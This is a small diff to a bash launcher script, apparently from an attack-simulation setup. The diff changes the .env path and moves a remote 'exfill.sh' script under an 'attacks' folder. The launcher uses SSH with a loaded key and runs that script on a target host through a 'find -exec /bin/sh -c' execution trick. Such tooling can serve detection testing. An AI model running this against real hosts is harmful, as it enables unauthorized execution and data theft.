@@ -6,7 +6,7 @@
 # *** MAKE VARIABLE CHANGES IN .env, NOT HERE ***
 # ****************************************************
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-source "$SCRIPT_DIR/.env"
+source "$SCRIPT_DIR/../.env"
 
 # List of required variables
 required_vars=(
@@ -39,6 +39,6 @@ fi
 # Load SSH key
 ssh-add $TARGET_HOST_SSH_KEY >/dev/null 2>&1
 
-ssh $TARGET_HOST_SSH_USER@$TARGET_HOST "/usr/bin/find . -exec /bin/sh -c $TARGET_HOST_ROOTDIR/scripts/linux/exfill.sh \; -quit"
+ssh $TARGET_HOST_SSH_USER@$TARGET_HOST "/usr/bin/find . -exec /bin/sh -c $TARGET_HOST_ROOTDIR/attacks/linux/exfill.sh \; -quit"
 
 ping $TARGET_HOST
